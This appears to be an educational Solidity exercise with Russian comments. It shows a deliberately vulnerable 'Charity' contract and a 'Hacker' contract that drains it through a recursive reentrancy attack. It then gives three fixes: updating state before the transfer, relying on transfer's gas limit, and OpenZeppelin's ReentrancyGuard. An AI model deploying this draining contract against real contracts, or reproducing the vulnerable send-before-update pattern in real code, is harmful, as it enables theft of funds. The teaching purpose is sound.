/*

всем можно взять по 2 эфира
*/
pragma solidity ^0.8.6;

contract Charity {
    mapping(address => bool) private caller;
    
    receive() external payable {
    }

    function getEther() external {  
        if (!caller[msg.sender]) {
            (bool success, ) = payable(msg.sender).call{value: 2 ether}("");  
            require(success, "Failed to transfer 1 Ether");
        }
        caller[msg.sender] = true;
    }
    
    function canReceiveEther() public view returns (bool) {
        return !caller[msg.sender];
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Hacker {
    Charity private victim;
    address payable private owner;

    constructor(address payable _victim) {
        victim = Charity(_victim);
        owner = payable(msg.sender);
    }

    receive() external payable {
        if (address(victim).balance >= 2 ether) 
            victim.getEther();
    }
    
    function transferToVictim() public payable {       //delete потом
        payable(address(victim)).transfer(msg.value);
    }

    function changeCharityContract(address payable _victim) public {
        victim = Charity(_victim);
    }
    
    function hack() public {
        victim.getEther();
    }
    
    function transferToOwner() public {
        return owner.transfer(address(this).balance);
    }
    
    function ownerBalance() public view returns (uint) {  //delete потом
        return address(owner).balance;
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


Методы защиты контракта Charity:

1.1 Лучше всего изменять переменные до функций call,send,transfer.
  Если есть transfer/send, то функция getEther() не сможет вызываться рекурсивно, 
  т.к. на transfer/send выделяется мало газа. 
  function getEther() external {  
      require(!caller[msg.sender],"Sorry, we can't transfer you another 2 ether.");
      caller[msg.sender] = true;
      payable(msg.sender).transfer(2 ether);  
  }

  function getEther() external {  
      require(!caller[msg.sender],"Sorry, we can't transfer you another 2 ether.");
      payable(msg.sender).transfer(2 ether);
      caller[msg.sender] = true;
  }

2. С помощью изменения переменной до call. Или же можно сделать call с контролем газа 
                                                         как transfer/send.
  modifier limitReceive(){
      require(!caller[msg.sender],"Sorry, we can't transfer you another 2 ether.");
      _;
  }
  function getEther() external limitReceive {  
      caller[msg.sender] = true;
      (bool success, ) = payable(msg.sender).call{value: 2 ether}("");  
      require(success,"Failed to transfer 1 Ether"); 
  }

3. С универсальным модификатором из библиотеки.
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol';
contract Charity is ReentrancyGuard {
    mapping(address => bool) private caller;
    
    receive() external payable {
    }

    function getEther() external nonReentrant {  
        if (!caller[msg.sender]){
            (bool success, ) = payable(msg.sender).call{value: 2 ether}("");
            require(success,"Failed to transfer 1 Ether");
        }
        caller[msg.sender] = true;
    }
 ...
}   